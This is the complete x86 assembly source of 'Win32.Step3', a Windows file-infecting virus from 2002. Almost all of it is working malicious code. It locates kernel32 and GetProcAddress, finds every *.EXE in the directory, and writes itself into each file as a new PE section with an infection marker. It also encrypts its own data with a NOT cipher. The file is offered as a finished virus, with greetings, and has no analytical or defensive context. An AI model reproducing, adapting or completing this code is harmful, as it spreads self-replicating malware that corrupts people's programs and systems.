;==============================================================================
;                             Win32.Step3 (c) dZen
;                                 august 2002
;greetz to all friends
;BIG thx to: Nekr0! :)
;==============================================================================

.386p
.model flat, stdcall

extrn ExitProcess:PROC

.data
Starter:    
        pusha
        Call    delta
delta:
        pop     ebp
        sub     ebp, offset delta
        
        lea     edi, [ebp+offset data]
        mov     ecx, datasize
Decrypt:
        not     byte ptr [edi]
        inc     edi
        loop    Decrypt

;==============================================================================
;Search kernel base and get "GetProcAddress" API
;==============================================================================

virus:
        mov     eax, [ebp+offset imbase]
        add     eax, [ebp+offset ep]
        mov     [esp+1ch], eax

        mov     esi, [esp+20h]
        mov     edx, 50h
        and     esi, 0ffff0000h

Search_Kernel:
        cmp     word ptr [esi], 'ZM'
        je      Check_Kernel
        dec     edx
        cmp     edx, 0
        je      _exit
        sub     esi, 1000h
        jmp     Search_Kernel

Check_Kernel:
        mov     edi, esi
        mov     esi, [esi+3ch]
        add     esi, edi
        cmp     word ptr [esi], 'EP'
        je      Get_Api
        xchg    esi, edi
        sub     esi, 1000h
        jmp     Search_Kernel

Get_Api:
        mov     [ebp+offset Kernel_addr], edi
        add     esi, 78h
        mov     ebx, [esi]
        add     ebx, edi

        mov     esi, [ebx+18h]
        mov     [ebp+offset NumberOfNames], esi
        mov     edx, esi

        mov     esi, [ebx+1ch]
        add     esi, edi
        mov     [ebp+offset ExportAddressTable], esi

        mov     esi, [ebx+20h]
        add     esi, edi
        mov     [ebp+offset ExportNameTableP], esi

        mov     esi, [ebx+24h]
        add     esi, edi
        mov     [ebp+offset ExportOrdinalTable], esi
        xor     ebx, ebx
        mov     esi, [ebp+offset ExportNameTableP]
        
Search_Api:
        mov     [ebp+Index], esi
        mov     esi, [esi]
        add     esi, [ebp+offset Kernel_addr]
        lea     edi, [ebp+offset API]
        mov     ecx, API_size
        repe     cmpsb
        je      Get_Addr
        add     dword ptr [ebp+offset Index], 4
        mov     esi, [ebp+offset Index]
        inc     ebx
        cmp     ebx, edx
        jge      _exit
        jmp     Search_Api

Get_Addr:
        xchg    eax, ebx
        mov     ebx, 2
        mul     ebx
        mov     esi, [ebp+offset ExportOrdinalTable]
        add     esi, eax

        xor     eax, eax
        mov     ax, word ptr [esi]
        mov     ecx, 4
        mul     ecx
        mov     esi, [ebp+offset ExportAddressTable]
        add     esi, eax
        lodsd
        add     eax, dword ptr [ebp+offset Kernel_addr]
        mov     [ebp+offset GPA], eax

;==============================================================================
;File infection
;==============================================================================

        lea     ecx, offset [ebp+Search_Rec]
        push    ecx
        lea     ecx, offset [ebp+filemask]
        push    ecx
        lea     eax, [ebp+offset FindFirstFileA_]
        call    GetApiAddr

        cmp     eax, -1
        je      Find_Next

        mov     [ebp+Search_Handle], eax

Infect:
        push    0
        push    80h
        push    3
        push    0
        push    1+2
        push    80000000h+40000000h
        lea     ecx, offset [ebp+file_fullname]
        push    ecx
        lea     eax, [ebp+offset CreateFileA_]
        call    GetApiAddr

        cmp     eax, -1
        je      Find_Next

        mov     ebx, eax
        mov     [ebp+offset filehandle], ebx

        push    0
        push    ebx
        lea     eax, [ebp+offset GetFileSize_]
        call    GetApiAddr

        and     ax, 0f000h
        add     eax, 00001000h
        mov     [ebp+offset filesize], eax
        add     eax, virsize

        push    eax
        push    0
        lea     eax, [ebp+offset GlobalAlloc_]
        call    GetApiAddr

        mov     edi, eax

        push    0
        push    esp
        mov     eax, [ebp+offset filesize]
        push    eax
        push    edi
        push    ebx
        lea     eax, [ebp+offset ReadFile_]
        call    GetApiAddr

        mov     esi, [edi+3ch]
        cmp     word ptr [edi+esi], "EP"
        jne     Find_Next
        mov     [ebp+offset PE_offs], esi
        add     esi, 58h
        cmp     dword ptr [edi+esi], 'KCUF'
        je      Find_Next

        mov     esi, [ebp+offset PE_offs]
        add     esi, 28h
        mov     eax, [edi+esi]
        mov     [ebp+offset ep], eax
        add     esi, 0ch
        mov     eax, [edi+esi]
        mov     [ebp+offset imbase], eax

;==============================================================================
;Create new section
;==============================================================================
        
        mov     esi, [ebp+offset PE_offs]
        xor     eax, eax
        add     esi, 06h
        mov     ax ,word ptr [edi+esi]
        mov     [ebp+NumOfObjects], ax

        add     esi, 0f2h
        xor     ebx, ebx
        xor     ecx, ecx
        xor     edx, edx
        mov     cx, [ebp+NumOfObjects]
        add     esi, 0ch
        mov     ebx, [edi+esi]

Search_RVA:
        mov     eax, [edi+esi]
        cmp     ebx, eax
        ja      Small
        mov     ebx, eax
        mov     edx, esi
Small:  add     esi, 28h
        loop    Search_RVA

        xchg    esi, edx

        add     ebx, dword ptr [edi+esi-4]
        and     bx, 0f000h
        add     bx, 1000h
        mov     [ebp+offset SectionRVA], ebx

        mov     ebx, [ebp+PE_offs]
        add     ebx, 108h
        mov     eax, 28h
        mov     cx, [ebp+NumOfObjects]
        dec     cx
        mul     cx
        add     eax, ebx

        mov     ebx, [edi+eax]
        add     ebx, [edi+eax+4]
        mov     [ebp+PhysicalOffset], ebx

;==============================================================================
;Write infected file to disk and new search
;==============================================================================        

        add     esi, 1ch

        push    edi
        add     edi, esi
        lea     esi, [ebp+offset ObjectEntry]
        mov     ecx, ObjectSize
        rep     movsb

        mov     edi, [esp]
        add     edi, [ebp+offset PhysicalOffset]
        lea     esi, [ebp+offset Starter]
        mov     ecx, virsize
        rep     movsb

        pop     edi
        mov     esi, [ebp+offset PE_offs]
        add     esi, 06h
        inc     word ptr [edi+esi]

        add     esi, 16h
        mov     eax, [ebp+offset VirtualSize]
        add     eax, dword ptr [edi+esi]

        add     esi, 0ch
        mov     ecx, [ebp+offset SectionRVA]
        mov     [edi+esi], ecx

        add     esi, 30h
        mov     [edi+esi], 'KCUF'

        push    edi
        add     edi, [ebp+offset PhysicalOffset]
        add     edi, data_offs
        mov     ecx, datasize
Crypt:  not     byte ptr [edi]
        inc     edi
        loop    Crypt
Write:
        pop     edi

        push    0
        push    0
        push    0
        mov     eax, [ebp+offset filehandle]
        push    eax
        lea     eax, [ebp+offset SetFilePointer_]
        call    GetApiAddr

        push    0
        push    esp
        mov     eax, [ebp+offset filesize]
        add     eax, virsize
        push    eax
        push    edi
        mov     eax, [ebp+offset filehandle]
        push    eax
        lea     eax, [ebp+offset WriteFile_]
        call    GetApiAddr

        mov     eax, [ebp+offset filehandle]
        push    eax
        lea     eax, [ebp+offset CloseHandle_]
        call    GetApiAddr

Find_Next:
        push    edi
        lea     eax, [ebp+offset GlobalFree_]
        call    GetApiAddr
        
        lea     ecx, offset [ebp+Search_Rec]
        push    ecx
        mov     ecx, [ebp+offset Search_Handle]
        push    ecx
        lea     eax, [ebp+offset FindNextFileA_]
        call    GetApiAddr

        or      eax, eax
        jnz     Infect

_exit:
        popa
        jmp     eax

GetApiAddr:
        push    eax
        mov     eax, [ebp+offset Kernel_addr]
        push    eax
        mov     eax, dword ptr [ebp+offset GPA]
        call    eax
        jmp     eax

;==============================================================================
;Virus data
;==============================================================================

data:
data_offs           equ $-Starter
NumOfObjects        dw ?
filesize            dd ?
filehandle          dd ?
imbase              dd 00400000h
ep                  dd 00001008h

ObjectEntry:
    ObjectName      db "CODE2",0,0,0
    VirtualSize     dd 00001000h
    SectionRVA      dd ?
    PhysicalSize    dd 00001000h
    PhysicalOffset  dd ?
    Reserved        db 0ch dup (0)
    ObjectFlags     dd 0c0000040h
ObjectSize          equ $-ObjectEntry

FindFirstFileA_     db "FindFirstFileA",0
CreateFileA_        db "CreateFileA",0
SetFilePointer_     db "SetFilePointer",0
CloseHandle_        db "CloseHandle",0
ReadFile_           db "ReadFile",0
GlobalAlloc_        db "GlobalAlloc",0
WriteFile_          db "WriteFile",0
FindNextFileA_      db "FindNextFileA",0
GetFileSize_        db "GetFileSize",0
GlobalFree_         db "GlobalFree",0
filemask            db "*.EXE",0

PE_offs             dd ?
NumberOfNames       dd ?
ExportAddressTable  dd ?
ExportNameTableP    dd ?
ExportOrdinalTable  dd ?
Kernel_addr         dd ?
API                 db "GetProcAddress", 0
API_size            equ $-API
Index               dd ?
GPA                 dd ?

Search_Handle       dd ?
Search_Rec:
file_attr               dd ?
file_create_time        dd ?
                        dd ?
file_last_access_time   dd ?
                        dd ?
file_last_write_time    dd ?
                        dd ?
file_size_high          dd ?
file_size_low           dd ?
file_reserved           dd ?
                        dd ?
file_fullname           db 260 dup (?)
file_dosname            db 14 dup (?)

virsize                 equ $-virus
datasize                equ $-data
virend:

;==============================================================================
;The END ;)
;==============================================================================

.code
start:
        pusha
        xor     ebp, ebp
        jmp     virus

        push    0
        call    ExitProcess
end start
end